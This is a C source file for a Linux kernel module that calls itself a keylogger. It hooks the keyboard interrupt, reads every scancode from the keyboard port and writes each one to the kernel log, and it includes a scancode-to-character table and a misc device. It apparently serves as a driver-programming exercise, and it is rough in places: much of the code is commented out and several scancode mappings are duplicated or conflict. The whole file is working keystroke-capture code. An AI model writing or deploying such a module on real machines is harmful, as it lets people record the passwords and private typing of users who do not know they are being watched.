// SPDX-License-Identifier: GPL-2.0+
#include "keylogger.h"

static LIST_HEAD(keyboard_entry_list);

DEFINE_MUTEX(keyboard_mutex);
DEFINE_SPINLOCK(keyboard_spinlock);

static const struct usb_device_id usb_module_id_table[2] = {
	{ USB_INTERFACE_INFO(
			USB_INTERFACE_CLASS_HID,
			USB_INTERFACE_SUBCLASS_BOOT,
			USB_INTERFACE_PROTOCOL_KEYBOARD) },
	{}
};
MODULE_DEVICE_TABLE(usb, usb_module_id_table);

// helpers
static int is_key_pressed(unsigned int scancode)
{
	return !(scancode & RELEASED_MASK);
}

static int get_ascii(unsigned int scancode)
{
	static char* row1 = "1234567890";
	static char* row2 = "qwertyuiop";
	static char* row3 = "asdfghjkl";
	static char* row4 = "zxcvbnm";

	scancode &= ~RELEASED_MASK;
	if(scancode >= 0x02 && scancode <= 0x0b)
		return *(row1 + scancode - 0x02);
	else if(scancode >= 0x10 && scancode <= 0x19)
		return *(row2 + scancode - 0x10);
	else if(scancode >= 0x1e && scancode <= 0x26)
		return *(row3 + scancode - 0x1e);
	else if(scancode >= 0x2c && scancode <= 0x32)
		return *(row4 + scancode - 0x2c);
	else if(scancode == 0x39)
		return ' ';
	else if(scancode == 0x0e) //backspace
		return '<';
	else if(scancode == 0x33 || scancode == 0xb3)
		return ',';
	else if(scancode == 0x29 || scancode == 0xa9)
		return '`';
	else if(scancode == 0x27 || scancode == 0xa7 || scancode == 0x4c)
		return ';';
	else if(scancode == 0x5b || scancode == 0xf0 || scancode == 0x1b)
		return ']';
	else if(scancode == 0x1a || scancode == 0x9a || scancode == 0x54)
		return '[';
	else if(scancode == 0x0d || scancode == 0x8d || scancode == 0x55)
		return '=';
	else if(scancode == 0x35 || scancode == 0xb5 || scancode == 0x4a)
		return '/';
	else if(scancode == 0x1d || scancode == 0x9d || scancode == 0x14) //ctrl
		return 'C';
	else if(scancode == 0x38 || scancode == 0xb8|| scancode == 0x11) //alt
		return 'A';
	else if(scancode == 0x3a || scancode == 0xba|| scancode == 0x58) //caps
		return 'C';
	else if(scancode == 0x0f || scancode == 0x8f || scancode == 0x0d) //tab
		return 'T';
	else if(scancode == 0x01 || scancode == 0x81 || scancode == 0x76) //escape
		return 'E';
	else if(scancode == 0x28 || scancode == 0xa8) //apostrof
		return '\'';
	else if(scancode == 0x4e || scancode == 0xce || scancode == 0x79) //plus
		return '+';
	else if(scancode == 0x0c || scancode == 0x4a || scancode == 0x8c || scancode == 0xca || scancode == 0x4e || scancode == 0x7b) //minus
		return '-';
	else if(scancode == 0x34 || scancode == 0x53 || scancode == 0xd3 || scancode == 0xb4 || scancode == 0x49 || scancode == 0x71) //punct
		return '.';
	else if(scancode == 0x37|| scancode == 0xb7 || scancode == 0xaa || scancode == 0x12 || scancode == 0x7c) //print screen
		return 'P'; 
	else if(scancode == 0x1c)
		return '\n';
	else if(scancode == 0x48 || scancode == 0x75) //up arrow
		return '^';
	else if(scancode == 0x50 || scancode == 0x72) //down arrow
		return 'V';
	else if(scancode == 0x36 || scancode == 0x12 || scancode == 0x59 || scancode == 0x2a) //shift
		return 'S';
	else
		return '?';
}


// misc ops
static ssize_t misc_read(struct file *file, char __user *buf, size_t count, loff_t *off)
{
	return 0;
}

static ssize_t misc_write(struct file *file, const char __user *buf, size_t count, loff_t *off)
{
	return 0;
}

static int misc_open(struct inode *inode, struct file *file)
{
	mutex_lock(&keyboard_mutex);
	return 0;
}

static int misc_release(struct inode *inode, struct file *file)
{
	mutex_unlock(&keyboard_mutex);
	return 0;
}

static struct file_operations fops = {
	.read		= misc_read,
	.write		= misc_write,
	.open		= misc_open,
	.release	= misc_release
};

static struct miscdevice keyboard_device = {
	.minor		= MISC_DYNAMIC_MINOR,
	.name		= "valmpani-keyboard",
	.fops		= &fops,
};

// irq section
//static irqreturn_t keyboard_handler(int irw, void *dev_id)
//{
//	u8 scancode	= inb(KEYBOARD_PORT);
//	int pressed	= is_key_pressed(scancode);
//	char key	= get_ascii(scancode);
//	(void)scancode;
//	(void) pressed;
//	(void) key;
//	//pr_info("scancode = 0x%X (%u) pressed=%d ch=%c\n", scancode, scancode, pressed, key);
//	pr_info("called\n");
//	return IRQ_HANDLED;
//}

static int key_state[256] = {0};

static irqreturn_t keyboard_handler(int irq, void *dev_id)
{
	u8 scancode = inb(KEYBOARD_PORT);
	int pressed = is_key_pressed(scancode);
	unsigned long flags;
	//pr_info("pressed %d\n", pressed);
	spin_lock_irqsave(&keyboard_spinlock, flags);
	key_state[scancode] = pressed;
//	if (key_state[scancode] == pressed) {
//		spin_unlock_irqrestore(&keyboard_spinlock, flags);
//		return IRQ_HANDLED; // Ignore repeat events
//	}

	char key = get_ascii(scancode);

//	pr_info("scancode = 0x%X (%u) %s ch=%c\n", scancode, scancode, pressed == 1 ? "pressed" : "released", key);
	pr_info("scancode %c\n", scancode);
	spin_unlock_irqrestore(&keyboard_spinlock, flags);

	return IRQ_HANDLED;
}

static int driver_irq_reg(void)
{
	int ret;
	ret = request_irq(PL2_IRQ, &keyboard_handler, IRQF_SHARED, "Keyloggerrrrr", &keyboard_entry_list);
	if (ret < 0) {
		pr_err("Failed to register interrupt request handler\n");
		//list_del(&entry->list);
		//kfree(entry);
		return ret;
	}
	pr_info("Return value %d\n", ret);
	return 0;
}

static void driver_irq_unregister(void)
{
//	struct keyboard_entry *entry, *tmp;
//
//	list_for_each_entry_safe(entry, tmp, &keyboard_entry_list, list) {
//		pr_info("freeing nodes\n");
//		free_irq(PL2_IRQ, entry);
//		list_del(&entry->list);
//		kfree(entry);
//	}
//
//	pr_info("IRQ unregistered\n");
	free_irq(PL2_IRQ, &keyboard_entry_list);
}


static int __init main(void)
{
	int err;
	err = driver_irq_reg();
	if (err) {
		pr_err("IRQ failed\n");
		return -EFAULT;
	}
	misc_register(&keyboard_device);
	return 0;
}

static void __exit cleanup(void)
{
	driver_irq_unregister();
	misc_deregister(&keyboard_device);
	pr_info("cleanup\n");
}

MODULE_AUTHOR("valmpanis");
MODULE_DESCRIPTION("Keylogger");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

module_init(main);
module_exit(cleanup);
